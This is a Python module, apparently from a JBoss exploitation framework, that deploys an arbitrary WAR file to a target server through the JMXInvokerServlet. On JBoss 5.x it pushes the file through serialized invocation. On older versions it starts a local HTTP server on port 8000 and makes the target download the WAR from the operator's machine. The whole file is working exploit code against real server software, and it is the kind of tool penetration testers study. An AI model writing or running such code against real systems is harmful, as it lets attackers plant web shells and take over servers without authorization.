from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import _serve, invkdeploy, waitServe
from threading import Thread
from os.path import abspath
from requests import get
from log import LOG
import utility

versions = ["Any", "3.2", "4.0", "4.2", "5.0", "5.1"]
title = JINTERFACES.JIN
def deploy(fingerengine, fingerprint):
    """
    """

    war_file = fingerengine.options.deploy
    war_name = war_file.rsplit("/", 1)[1]

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/invoker/JMXInvokerServlet".format(
                   fingerengine.options.ip, fingerprint.port)
    local_url = "http://{0}:8000/{1}".format(utility.local_address(), war_name)

    # the attached fingerprint doesnt have a version; lets pull one of the others
    # to fetch it.  dirty hack.
    fp = [f for f in fingerengine.fingerprints if f.version != 'Any'][0]
    if fp.version in ["5.0", "5.1"]:
        response = invkdeploy(fp.version, url, abspath(war_file))

        if len(response) > 1:
            utility.Msg(response, LOG.DEBUG)
        else:
            utility.Msg("{0} deployed to {1}".format(war_file,
                                    fingerengine.options.ip), LOG.SUCCESS)
    else:
        # start the local HTTP server
        server_thread = Thread(target=_serve, args=(war_file,))
        server_thread.start()

        # run serialization code
        response = invkdeploy(fp.version, url, local_url)

        if waitServe(server_thread):
            utility.Msg("{0} deployed to {1}".format(war_file, 
                                    fingerengine.options.ip), LOG.SUCCESS)
        else:
            utility.Msg("JMXInvokerServlet not vulnerable", LOG.ERROR)

        try:
            get("http://localhost:8000/", timeout=1.0)
        except:
            pass
